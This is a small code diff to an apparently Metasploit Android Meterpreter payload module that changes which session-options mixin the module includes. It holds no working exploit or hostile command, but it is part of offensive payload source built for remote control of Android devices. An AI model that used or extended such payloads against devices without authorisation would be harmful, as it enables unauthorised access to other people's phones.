@@ -5,7 +5,7 @@
 
 module MetasploitModule
   include Msf::Payload::Android::MeterpreterLoader
-  include Msf::Sessions::MeterpreterOptions
+  include Msf::Sessions::MeterpreterOptions::Android
 
   def initialize(info = {})
     super(
